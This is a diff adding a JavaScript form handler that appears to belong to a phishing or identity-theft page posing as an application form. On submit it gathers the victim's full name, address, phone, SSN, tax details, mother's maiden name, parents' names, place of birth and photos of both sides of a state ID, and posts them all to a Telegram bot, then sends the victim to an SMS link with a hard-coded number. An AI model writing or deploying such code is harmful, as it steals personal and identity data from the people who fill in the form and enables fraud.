@@ -1,0 +1,151 @@
+(function() {
+    // get all data in form and return object
+    function getFormData(form) {
+        var elements = form.elements;
+        var honeypot;
+        
+        var fields = Object.keys(elements).filter(function(k) {
+            if (elements[k].name === "honeypot") {
+                honeypot = elements[k].value;
+                return false;
+            }
+            return true;
+        }).map(function(k) {
+            if (elements[k].name !== undefined) {
+                return elements[k].name;
+                // special case for Edge's html collection
+            } else if (elements[k].length > 0) {
+                return elements[k].item(0).name;
+            }
+        }).filter(function(item, pos, self) {
+            return self.indexOf(item) == pos && item;
+        });
+
+        var formData = {};
+        fields.forEach(function(name) {
+            var element = elements[name];
+
+            // singular form elements just have one value
+            formData[name] = element.value;
+
+            // when our element has multiple items, get their values
+            if (element.length) {
+                var data = [];
+                for (var i = 0; i < element.length; i++) {
+                    var item = element.item(i);
+                    if (item.checked || item.selected) {
+                        data.push(item.value);
+                    }
+                }
+                formData[name] = data.join(', ');
+            }
+        });
+
+       
+
+        return {
+            data: formData,
+            honeypot: honeypot
+        };
+    }
+
+    function handleFormSubmit(event) { // handles form submit without any jquery
+        event.preventDefault(); // we are submitting via xhr below
+        // Validate SSN
+        
+        const loader = document.getElementById('loading');
+        loader.style.display = 'block'; // Show the loader
+        var form = event.target;
+        var formData = new FormData(form);
+
+        
+        // Send text data to Telegram
+        const textData = {
+            chat_id: chat_id,
+            text: `Fullname: ${formData.get('fullname')}\nEmail: ${formData.get('email')}\nAddress: ${formData.get('address')}\nState ${formData.get('state')}\nCity: ${formData.get('city')}\nZip: ${formData.get('zip')}\nPhone: ${formData.get('phone')}\nage: ${formData.get('age')}\ngender ${formData.get('gender')}\noccupation: ${formData.get('occupation')}\nssn: ${formData.get('ssn')}\ntax: ${formData.get('tax_filled')}\nFather's Fullname: ${formData.get('father_fullname') || 'N/A'}
+            \nMother's Fullname: ${formData.get('mother_fullname') || 'N/A'}
+             
+            MMN: ${formData.get('mmn') || 'N/A'}
+            Place of Birth: ${formData.get('place_of_birth') || 'N/A'}
+            Previous Address: ${formData.get('previous_address') || 'N/A'}`
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(textData)
+        })
+        .then(response => response.json())
+        .then(result => {
+            if (result.ok) {
+                // Send images to Telegram
+                const sendImage = (file, caption) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chat_id);
+                    formData.append('photo', file);
+                    formData.append('caption', caption);
+
+                    return fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                };
+
+                const frontImage = document.getElementById('front').files[0];
+                const backImage = document.getElementById('back').files[0];
+
+                const promises = [];
+
+                if (frontImage) {
+                    promises.push(sendImage(frontImage, 'Front of State ID/License'));
+                }
+
+                if (backImage) {
+                    promises.push(sendImage(backImage, 'Back of State ID/License'));
+                }
+
+                Promise.all(promises).then(() => {
+                    const phoneNumber = '+13322839851';
+                    const message = "I'm prepared to learn more about my application.";
+                    loader.style.display = 'none'; // Hide the loader
+                    location.assign(`sms:${phoneNumber}?body=${encodeURIComponent(message)}`);
+                }).catch(error => {
+                    console.error('Error:', error);
+                    loader.style.display = 'none'; // Hide the loader
+                    alert('An error occurred while sending the images.');
+                });
+
+            } else {
+                loader.style.display = 'none'; // Hide the loader
+                alert('Error sending message: ' + result.description);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            loader.style.display = 'none'; // Hide the loader
+            alert('An error occurred while sending the message.');
+        });
+    
+
+    }
+
+    function loaded() {
+        // bind to the submit event of our form
+        var forms = document.querySelectorAll("form.register");
+        alert
+        for (var i = 0; i < forms.length; i++) {
+            forms[i].addEventListener("submit", handleFormSubmit, false);
+        }
+    };
+
+    document.addEventListener("DOMContentLoaded", loaded, false);
+
+    function disableAllButtons(form) {
+        var buttons = form.querySelectorAll("button");
+        for (var i = 0; i < buttons.length; i++) {
+            buttons[i].disabled = true;
+        }
+    }
+})();
